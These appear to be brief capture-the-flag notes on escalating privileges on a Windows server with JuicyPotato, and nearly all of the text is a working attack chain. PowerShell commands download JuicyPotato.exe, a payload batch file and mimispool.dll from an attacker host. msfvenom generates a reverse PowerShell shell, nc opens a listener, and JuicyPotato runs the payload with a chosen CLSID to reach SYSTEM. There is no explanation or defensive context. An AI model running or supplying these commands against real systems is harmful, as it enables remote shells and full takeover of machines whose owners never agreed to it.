first we need to get this exe onto the machine
`https://github.com/ohpe/juicy-potato/releases`

we use this command to grab the file from our attack machine
`powershell -c "Invoke-WebRequest" -Uri 'http://10.10.14.6:80/JuicyPotato.exe' -OutFile 'c:\inetpub\wwwroot\JuicyPotato.exe'`

---

we generate a batch file for our payload
`msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.6 lport=5555 > hax.bat`

then we grab it from the victim machine
`powershell -c "Invoke-WebRequest" -Uri 'http://10.10.14.6:80/hax.bat' -OutFile 'c:\inetpub\wwwroot\hax.bat'`

we can grab a CLSID from here: 
`https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/`

set up a listener on attacker machine
`nc -lvnp 5555`

we then execute this command to run the batch file
```
JuicyPotato.exe -l 1337 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}" -p hax.bat -t *
```

this will give us root

powershell -c "Invoke-WebRequest" -Uri 'http://10.10.14.6:80/mimispool.dll' -OutFile 'c:\windows\temp\mimispool.dll'